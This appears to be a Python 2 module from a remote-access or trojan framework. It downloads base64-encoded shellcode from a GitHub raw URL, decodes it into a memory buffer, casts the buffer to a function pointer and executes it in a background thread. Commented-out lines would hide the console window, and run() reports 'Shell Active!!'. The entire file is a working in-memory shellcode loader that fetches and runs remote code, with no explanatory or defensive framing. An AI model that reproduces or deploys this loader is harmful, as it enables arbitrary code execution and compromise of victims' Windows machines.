import win32api
import win32console
import win32gui

#win=win32console.GetConsoleWindow()
#win32gui.ShowWindow(win,0)
import urllib2
import ctypes
import base64
import threading

# retrieve shellcode from server
def shell_code():
    url = "https://raw.githubusercontent.com/Psyberlupus/psygn/master/modules/shellcode.bin"
    response = urllib2.urlopen(url)
# decode the shellcode from base64
    shellcode = base64.b64decode(response.read())
#create a buffer in memeory
    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
# a afunction pointer to the shell code
    shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE (ctypes.c_void_p))

    shellcode_func()
	
def run(**args):
    print "Shellcode!!!>>>>>>>>>>>>>>>>>>>>>>>>>>>"
    thread_c = threading.Thread(target=shell_code)
    thread_c.start() 
    str = "[*]   Shell Active!!"
    return str
